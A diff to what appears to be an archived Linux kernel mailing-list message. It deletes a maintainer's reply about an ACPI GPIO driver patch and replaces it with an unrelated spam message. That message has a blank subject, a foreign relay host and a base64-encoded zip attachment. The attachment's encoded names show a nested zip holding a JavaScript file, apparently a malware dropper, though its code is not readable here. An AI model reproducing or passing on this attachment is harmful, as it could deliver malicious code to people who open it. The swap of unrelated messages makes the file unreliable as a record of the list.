@@ -1,49 +1,75 @@
-From: "Rafael J. Wysocki" <rafael@kernel.org>
-Subject: Re: [PATCH v6] platform/x86: Add driver for ACPI INT0002 Virtual GPIO device
-Date: Fri, 9 Jun 2017 02:30:14 +0200
-Message-ID: <CAJZ5v0guq1zRwU8ETe5+n6QSj+ytg_HewnrP7h2TsJFQNE9gxg@mail.gmail.com>
-References: <20170602151507.22391-1-hdegoede@redhat.com> <20170602151507.22391-2-hdegoede@redhat.com>
- <CAHp75Vcdznj2mB+msNvysrvRi3L-0j4c6vthOS8oAv1S9iYWKA@mail.gmail.com>
- <20170608154541.GH32509@fury> <d41ff55b-e28f-85bf-d088-392e363fb41f@redhat.com>
- <CAJZ5v0jw3Rzjkb3J2_XE7TPBjT+7FUW90B7kg15z6_WpdNGjzA@mail.gmail.com> <CAHp75Vc-Vz-QRAkrq2z3B9MaAPFEVX06ePAJuxjwqcLULjRbFw@mail.gmail.com>
+From: <susan.christian@state.sd.us>
+Subject: (unknown)
+Date: Fri, 09 Jun 2017 00:39:18 -0000
+Message-ID: <149696875887.29697.1554682546255156975@is74.ru>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="UTF-8"
-Return-path: <linux-acpi-owner@vger.kernel.org>
-In-Reply-To: <CAHp75Vc-Vz-QRAkrq2z3B9MaAPFEVX06ePAJuxjwqcLULjRbFw@mail.gmail.com>
-Sender: linux-acpi-owner@vger.kernel.org
-To: Andy Shevchenko <andy.shevchenko@gmail.com>
-Cc: "Rafael J. Wysocki" <rafael@kernel.org>, Hans de Goede <hdegoede@redhat.com>, Darren Hart <dvhart@infradead.org>, "Rafael J . Wysocki" <rjw@rjwysocki.net>, Linus Walleij <linus.walleij@linaro.org>, Alexandre Courbot <gnurou@gmail.com>, "linux-acpi@vger.kernel.org" <linux-acpi@vger.kernel.org>, Platform Driver <platform-driver-x86@vger.kernel.org>, Andy Shevchenko <andriy.shevchenko@linux.intel.com>, "linux-gpio@vger.kernel.org" <linux-gpio@vger.kernel.org>, joeyli <jlee@suse.com>, Takashi Iwai <tiwai@suse.de>
-List-Id: platform-driver-x86.vger.kernel.org
+Content-Type: application/zip; name="577788.zip"
+Content-Transfer-Encoding: base64
+Return-path: <platform-driver-x86-owner@vger.kernel.org>
+Received: from pool-37-140-41-223.is74.ru ([37.140.41.223]:39324 "HELO is74.ru"
+        rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1751428AbdFIAjY (ORCPT
+        <rfc822;platform-driver-x86@vger.kernel.org>);
+        Thu, 8 Jun 2017 20:39:24 -0400
+Content-Disposition: attachment
+Subject: 
+Sender: platform-driver-x86-owner@vger.kernel.org
+List-ID: <platform-driver-x86.vger.kernel.org>
+To: platform-driver-x86@vger.kernel.org
 
-On Thu, Jun 8, 2017 at 7:40 PM, Andy Shevchenko
-<andy.shevchenko@gmail.com> wrote:
-> On Thu, Jun 8, 2017 at 8:15 PM, Rafael J. Wysocki <rafael@kernel.org> wrote:
->> On Thu, Jun 8, 2017 at 6:45 PM, Hans de Goede <hdegoede@redhat.com> wrote:
->>> On 06/08/2017 05:45 PM, Darren Hart wrote:
->>>> On Wed, Jun 07, 2017 at 05:53:38PM +0300, Andy Shevchenko wrote:
->>>>> On Fri, Jun 2, 2017 at 6:15 PM, Hans de Goede <hdegoede@redhat.com>
->>>>> wrote:
->
->>>> Will you be taking this through fixes Andy? For a 4.12-rc* target per
->>>> Hans'
->>>> response to the cover letter?
->
->>> Note that Rafael is planning to drop (revert) the commit which makes
->>> it (extra) desirable for this driver to get into 4.12, so we should
->>> perhaps reconsider that. I'm fine either way, but the primary reason
->>> to push this as a fix for 4.12 is no longer valid AFAICT.
->>
->> Maybe I will just queue it up along with this series:
->> http://marc.info/?l=linux-kernel&m=149688087904433&w=2
->> if Andy and Darren agree?
->
-> Looks like it has ties to your series, so, I see no obstacles to go via PM tree.
-
-OK, thanks!
-
-> Darren?
-
-An ACK or equivalent from Linus W would be good to have too ...
-
-Thanks,
-Rafael
+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
+AQABAE4AAADpCwAAAAA=
